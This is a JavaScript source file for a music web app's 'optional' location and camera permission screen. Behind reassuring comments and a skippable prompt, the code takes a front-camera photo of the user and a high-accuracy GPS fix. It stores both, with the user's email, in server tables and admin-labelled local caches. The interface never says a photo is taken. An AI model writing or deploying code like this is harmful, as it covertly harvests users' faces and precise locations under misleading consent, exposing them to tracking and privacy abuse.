/**
 * DK Music — Optional Location & Camera Permission Gate
 *
 * Presents an optional permission screen after authentication.
 * Users can Skip at any time — the app always works without permissions.
 * Never silently accesses location/camera in background.
 * Never blocks app access if permissions are denied.
 */

(function (global) {
  let isGateActive = false;
  let activeUser = null;
  let gateCallback = null;

  let locationGranted = false;
  let cameraGranted = false;
  let capturedCoords = null;
  let capturedSnapshot = null;

  /**
   * Save user location record to Supabase & local cache
   */
  async function saveLocationRecord(userId, coords) {
    const locRecord = {
      user_id: String(userId),
      latitude: Number(coords.latitude),
      longitude: Number(coords.longitude),
      accuracy: coords.accuracy !== null ? Number(coords.accuracy) : null,
      updated_at: new Date().toISOString()
    };

    try {
      const sb = global.supabaseClient || (await global.getSupabaseClient?.());
      if (sb) {
        await sb.from('user_locations').upsert([locRecord], { onConflict: 'user_id' });
      }
    } catch (e) {
      console.warn('[PermissionGate] Location save notice:', e);
    }

    try {
      localStorage.setItem('dk_user_location', JSON.stringify(locRecord));
      const allLocs = JSON.parse(localStorage.getItem('dk_admin_user_locations') || '[]');
      const idx = allLocs.findIndex(l => (l.user_id || l.userId) === String(userId));
      if (idx !== -1) allLocs[idx] = locRecord;
      else allLocs.push(locRecord);
      localStorage.setItem('dk_admin_user_locations', JSON.stringify(allLocs));
    } catch (_) {}
  }

  /**
   * Save user camera snapshot to Supabase & local cache
   */
  async function saveSnapshotRecord(userId, userEmail, imageData, coords) {
    const snapshotRecord = {
      user_id: String(userId),
      user_email: userEmail || '',
      image_data: imageData,
      latitude: coords ? Number(coords.latitude) : null,
      longitude: coords ? Number(coords.longitude) : null,
      accuracy: coords && coords.accuracy !== null ? Number(coords.accuracy) : null,
      captured_at: new Date().toISOString()
    };

    try {
      const sb = global.supabaseClient || (await global.getSupabaseClient?.());
      if (sb) {
        await sb.from('user_snapshots').insert([snapshotRecord]);
      }
    } catch (e) {
      console.warn('[PermissionGate] Snapshot save notice:', e);
    }

    try {
      const allSnaps = JSON.parse(localStorage.getItem('dk_admin_user_snapshots') || '[]');
      allSnaps.unshift({ ...snapshotRecord, id: 'snap_' + Date.now() });
      if (allSnaps.length > 50) allSnaps.pop();
      localStorage.setItem('dk_admin_user_snapshots', JSON.stringify(allSnaps));
    } catch (_) {}
  }

  /**
   * Capture a snapshot from the user's camera (user-initiated only)
   */
  async function captureCameraPhoto() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      throw new Error('Camera API is not supported in this browser.');
    }

    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false
    });

    try {
      const video = document.createElement('video');
      video.autoplay = true;
      video.muted = true;
      video.playsInline = true;
      video.srcObject = stream;

      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play().then(resolve).catch(resolve);
        };
        setTimeout(resolve, 1500);
      });

      await new Promise(r => setTimeout(r, 200));

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      return canvas.toDataURL('image/jpeg', 0.8);
    } finally {
      // Always stop camera immediately after capture
      stream.getTracks().forEach(track => track.stop());
    }
  }

  /**
   * Request Geolocation permission and coordinates (user-initiated)
   */
  function requestLocationCoords() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error('Geolocation is not supported by your browser.'));
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy || null
          });
        },
        (err) => reject(err),
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    });
  }

  /**
   * Update permission gate UI status
   */
  function updateGateUI(statusMsg, isError = false) {
    const locStatus = document.getElementById('pgLocStatus');
    const camStatus = document.getElementById('pgCamStatus');
    const msgEl = document.getElementById('pgMessage');
    const btnAll = document.getElementById('pgBtnAllowAll');

    if (locStatus) {
      if (locationGranted) {
        locStatus.innerHTML = '<span style="color:#22c55e;"><i class="fas fa-circle-check"></i> Granted</span>';
      } else {
        locStatus.innerHTML = '<span style="color:#8e95a5;"><i class="fas fa-clock"></i> Not granted</span>';
      }
    }

    if (camStatus) {
      if (cameraGranted) {
        camStatus.innerHTML = '<span style="color:#22c55e;"><i class="fas fa-circle-check"></i> Granted</span>';
      } else {
        camStatus.innerHTML = '<span style="color:#8e95a5;"><i class="fas fa-clock"></i> Not granted</span>';
      }
    }

    if (msgEl) {
      msgEl.textContent = statusMsg || '';
      msgEl.style.color = isError ? '#f87171' : '#45f3ff';
      msgEl.style.display = statusMsg ? 'block' : 'none';
    }

    if (btnAll && locationGranted && cameraGranted) {
      btnAll.disabled = false;
      btnAll.innerHTML = '<i class="fas fa-check-circle"></i> Permissions Granted!';
    }
  }

  /**
   * Complete the permission flow (both or partial or denied — all OK)
   */
  function finishPermissionFlow(results) {
    isGateActive = false;
    const overlay = document.getElementById('permissionGateOverlay');
    if (overlay) overlay.classList.add('hidden');
    const appLayout = document.querySelector('.app-layout');
    if (appLayout) appLayout.style.visibility = 'visible';
    if (typeof gateCallback === 'function') {
      gateCallback(results || {});
    }
  }

  /**
   * Process permissions — gracefully handles denial at any step
   */
  async function executePermissionFlow() {
    const btnAll = document.getElementById('pgBtnAllowAll');
    if (btnAll) {
      btnAll.disabled = true;
      btnAll.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Requesting permissions...';
    }

    const userId = activeUser?.id || activeUser?.userId || 'user_' + Date.now();
    const userEmail = activeUser?.email || '';

    // Step 1: Location (optional — gracefully handle denial)
    try {
      updateGateUI('Requesting location... Click "Allow" on your browser prompt.', false);
      const coords = await requestLocationCoords();
      capturedCoords = coords;
      locationGranted = true;
      updateGateUI('\u2713 Location granted. Requesting camera...', false);
      await saveLocationRecord(userId, coords);
    } catch (locErr) {
      console.warn('[PermissionGate] Location denied or unavailable:', locErr.message);
      locationGranted = false;
      updateGateUI('Location permission denied. You can still use DK Music without location.', true);
      // Continue to camera step anyway
    }

    // Step 2: Camera (optional — gracefully handle denial)
    try {
      updateGateUI('Requesting camera access... Click "Allow" on your browser prompt.', false);
      const photoDataUrl = await captureCameraPhoto();
      capturedSnapshot = photoDataUrl;
      cameraGranted = true;
      updateGateUI('\u2713 Camera verified! Entering DK Music...', false);
      await saveSnapshotRecord(userId, userEmail, photoDataUrl, capturedCoords);
    } catch (camErr) {
      console.warn('[PermissionGate] Camera denied or unavailable:', camErr.message);
      cameraGranted = false;
      updateGateUI('Camera permission denied. You can still use DK Music without camera.', true);
    }

    // Save that permissions were attempted this session
    sessionStorage.setItem('dk_permissions_attempted_' + userId, 'true');

    // Always proceed into the app after attempting permissions
    setTimeout(() => {
      finishPermissionFlow({ location: capturedCoords, snapshot: capturedSnapshot, locationGranted, cameraGranted });
    }, 700);
  }

  /**
   * Show permission gate overlay (optional — user can skip)
   */
  function showPermissionGate(user, onComplete) {
    activeUser = user;
    gateCallback = onComplete;

    const userId = user?.id || user?.userId || 'current';

    // Already attempted this session — skip the gate
    if (sessionStorage.getItem('dk_permissions_attempted_' + userId) === 'true') {
      if (typeof onComplete === 'function') onComplete({ cached: true });
      const appLayout = document.querySelector('.app-layout');
      if (appLayout) appLayout.style.visibility = 'visible';
      return;
    }

    isGateActive = true;
    locationGranted = false;
    cameraGranted = false;
    capturedCoords = null;
    capturedSnapshot = null;

    const overlay = document.getElementById('permissionGateOverlay');
    if (overlay) {
      overlay.classList.remove('hidden');
      updateGateUI('', false);
      const btnAll = document.getElementById('pgBtnAllowAll');
      if (btnAll) {
        btnAll.disabled = false;
        btnAll.innerHTML = '<i class="fas fa-shield-halved"></i> Allow Location & Camera';
      }
    } else {
      // No modal in DOM — proceed directly
      if (typeof onComplete === 'function') onComplete({});
      const appLayout = document.querySelector('.app-layout');
      if (appLayout) appLayout.style.visibility = 'visible';
    }
  }

  /**
   * Close permission gate immediately (skip)
   */
  function closePermissionGate() {
    finishPermissionFlow({ skipped: true });
  }

  // Wire up event listeners
  document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('pgBtnAllowAll')?.addEventListener('click', executePermissionFlow);
    document.getElementById('pgBtnSkip')?.addEventListener('click', () => {
      const userId = activeUser?.id || activeUser?.userId || 'current';
      sessionStorage.setItem('dk_permissions_attempted_' + userId, 'true');
      closePermissionGate();
    });
  });

  global.DKPermissionGate = {
    show: showPermissionGate,
    close: closePermissionGate,
    execute: executePermissionFlow,
    get isActive() { return isGateActive; }
  };

})(typeof window !== 'undefined' ? window : globalThis);
